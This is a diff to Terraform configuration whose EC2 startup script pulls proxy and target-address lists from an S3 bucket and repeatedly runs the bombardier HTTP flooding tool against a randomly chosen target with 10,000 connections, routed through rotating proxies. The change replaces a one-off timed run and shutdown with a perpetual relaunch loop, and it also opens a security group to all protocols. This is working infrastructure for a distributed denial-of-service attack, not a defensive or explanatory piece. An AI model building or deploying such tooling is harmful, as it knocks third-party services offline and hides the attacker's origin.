@@ -137,7 +137,7 @@ resource "aws_security_group" "instance_connect" {
     from_port        = 0
     ipv6_cidr_blocks = []
     prefix_list_ids  = []
-    protocol         = "tcp"
+    protocol         = -1
     security_groups  = []
     self             = false
     to_port          = 0
@@ -172,35 +172,22 @@ exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
     service docker start
     usermod -a -G docker ec2-user
     chkconfig docker on
-    aws s3 cp s3://${var.bucket_name}/proxies.txt proxies.txt
-    aws s3 cp s3://${var.bucket_name}/addresses.txt addresses.txt
-    export DOCKER_PROXY=$(shuf -n 1 proxies.txt)
-    export TARGET_ADDRESS=$(shuf -n 1 addresses.txt)
-#    export EC2_INSTANCE_ID=$(ec2metadata --instance-id)
-#    aws ec2 create-tags --resources $${EC2_INSTANCE_ID} --tags Key=dTarget,Value=$${TARGET_ADDRESS}
-#    export DOCKER_PROXY=$${DOCKER_PROXY/\r/}
-    export RUN_FOR=$(shuf -i 8-26 -n 1)
-    date
-    docker run --rm -ti -d --name volia --env HTTP_PROXY="http://$${DOCKER_PROXY}" alpine/bombardier -c 10000 -d $${RUN_FOR}m -l $${TARGET_ADDRESS}
-#    sleep 60
-#    date
-#    shutdown +$${RUN_FOR}
-    for (( c=1; c<=$${RUN_FOR}; c++ ))
+    while true
     do
         sleep 60
-        docker ps
-# shut down if docker died
         if [ $(docker info --format '{{ .ContainersRunning }}') == "0" ]
         then
-          echo no container running
-          systemctl --force --force poweroff
+            echo no container running
+            aws s3 cp s3://${var.bucket_name}/proxies.txt proxies.txt
+            sed 's/\r$//' proxies.txt > proxies1.txt
+            aws s3 cp s3://${var.bucket_name}/addresses.txt addresses.txt
+            sed 's/\r$//' addresses.txt > addresses1.txt
+            export DOCKER_PROXY=$(shuf -n 1 proxies1.txt)
+            export TARGET_ADDRESS=$(shuf -n 1 addresses1.txt)
+            export RUN_FOR=$(shuf -i 12-26 -n 1)
+            date
+            docker run --rm -ti -d --name volia --env HTTP_PROXY="http://$${DOCKER_PROXY}" alpine/bombardier -c 10000 -d $${RUN_FOR}m -l $${TARGET_ADDRESS}
         fi
-    done
-    date
-# shut down a few times because it sometimes ignores shutdown command
-    for (( c=1; c<=$${RUN_FOR}; c++ ))
-    do
-      systemctl --force --force poweroff
     done
 
 EOF
